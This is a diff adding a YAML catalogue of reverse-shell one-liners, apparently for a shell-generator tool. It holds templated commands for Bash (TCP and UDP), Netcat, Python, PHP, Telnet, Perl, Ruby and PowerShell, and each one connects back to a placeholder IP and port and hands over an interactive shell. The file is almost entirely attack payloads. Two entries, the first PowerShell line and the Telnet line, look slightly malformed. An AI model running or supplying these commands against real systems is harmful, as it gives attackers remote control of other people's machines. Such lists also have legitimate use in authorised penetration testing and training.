@@ -1,0 +1,43 @@
+- category: Bash TCP
+  shells:
+    - bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1
+    - 0<&196;exec 196<>/dev/tcp/{{ip}}/{{port}}; sh <&196 >&196 2>&196
+
+- category: Bash UDP
+  shells:
+    - "sh -i >& /dev/udp/{{ip}}/{{port}} 0>&1 # Listen with nc -ulvp PORT"
+
+- category: Netcat
+  shells:
+    - nc -e /bin/bash {{ip}} {{port}}
+    - /bin/sh | nc {{ip}} {{port}}
+
+- category: Python
+  shells:
+    - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{ip}}",{{port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- category: PHP
+  shells:
+    - php -r '$sock=fsockopen("{{ip}}",{{port}});exec("/bin/sh -i <&3 >&3 2>&3");'
+
+- category: Telnet
+  shells:
+    - rm -f /tmp/p; mknod /tmp/p p && telnet {{ip}} {{port}} 0/tmp/p
+
+- category: Perl
+  shells:
+    - perl -e 'use Socket;$i="{{ip}}";$p={{port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+- category: Ruby Linux
+  shells:
+    - ruby -rsocket -e'f=TCPSocket.open("{{ip}}",{{port}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+    - ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{{ip}}","{{port}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+- category: Ruby Windows
+  shells:
+    - ruby -rsocket -e 'c=TCPSocket.new("{{ip}}","{{port}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+- category: Powershell
+  shells:
+    - powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{{ip}}",{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+    - powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{ip}}',{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
